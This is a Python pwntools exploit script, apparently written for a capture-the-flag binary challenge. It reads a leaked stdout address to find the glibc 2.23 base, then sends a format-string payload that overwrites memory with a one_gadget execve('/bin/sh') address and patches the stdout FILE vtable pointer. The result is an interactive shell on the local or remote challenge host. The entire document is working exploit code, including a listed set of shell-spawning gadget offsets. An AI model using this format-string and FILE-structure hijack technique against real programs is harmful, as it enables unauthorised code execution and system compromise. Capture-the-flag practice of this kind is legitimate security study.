#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or './app_patched', checksec=False)
libc = ELF("./libc-2.23.so", checksec=False)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("challenges.ctf.sd", 34021)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def logleak(name: str, addr: int): print(f"[*] %s => %#lx" % (name, addr))


"""
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
"""

io = start()

sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
s = lambda a: io.send(a)
rlu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
itb = lambda a: str(a).encode()

rlu(b'Clue: ')
stdout = int(rl().strip(), 16)
libc.address = stdout - libc.sym['_IO_2_1_stdout_']

logleak("glibc base", libc.address)
logleak("vtable", libc.sym['_IO_file_jumps'])

bytes_to_write = (libc.sym['_IO_file_jumps'] & 0xffff) + 0x2010

payload = fmtstr_payload(8, {libc.bss()+0x8 : libc.address + 0x4527a, libc.sym['_IO_2_1_stdout_']+216 : p16(bytes_to_write)}, no_dollars=True)
payload = payload.replace(b'cccccccc', p64(libc.bss()+0x18)) # replace cccccccc with some random writable address to prevent crash
logleak("libc .bss", libc.bss())

sl(payload)

io.interactive()

